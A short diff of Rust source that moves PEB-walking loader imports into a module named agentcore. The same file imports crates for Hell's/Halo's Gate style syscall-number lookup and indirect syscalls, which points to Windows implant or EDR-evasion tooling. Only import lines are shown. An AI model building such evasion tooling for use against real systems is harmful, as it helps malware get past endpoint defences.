@@ -8,8 +8,8 @@ use core::sync::atomic::Ordering;
 use core::sync::atomic::{AtomicBool, AtomicIsize};
 use spin::Mutex;
 
+use mod_agentcore::ldr::{ldr_function_addr, ldr_module_peb};
 use mod_hhtgates::get_syscall_number;
-use mod_win32::ldr::{ldr_function_addr, ldr_module_peb};
 
 use rs2_indirect_syscall::run_syscall;
 use rs2_win32::ntapi::NtSyscall;
